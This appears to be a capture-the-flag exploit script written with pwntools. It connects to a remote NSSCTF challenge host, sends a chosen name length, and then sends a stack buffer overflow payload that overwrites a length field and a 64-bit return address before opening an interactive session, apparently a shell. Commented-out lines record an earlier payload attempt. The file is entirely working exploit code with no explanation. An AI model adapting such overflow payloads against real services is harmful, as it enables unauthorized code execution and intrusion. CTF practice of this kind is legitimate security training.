from pwn import *
import struct
p = remote('node4.anna.nssctf.cn',29986)

#v2 = 0x41348000

#payload=b'a'*(0x30-0x4)+p32(v2)

#p.sendline(payload)

#print(p.recvall())
#p.interactive()
p.recvuntil("length of your name:\n")
p.sendline('1024')
p.recvuntil("What's u name?\n")
payload = b'a'*12 + p32(1024) + b'a'*8 + p64(0x00000000004006E6)
p.sendline(payload)
p.interactive()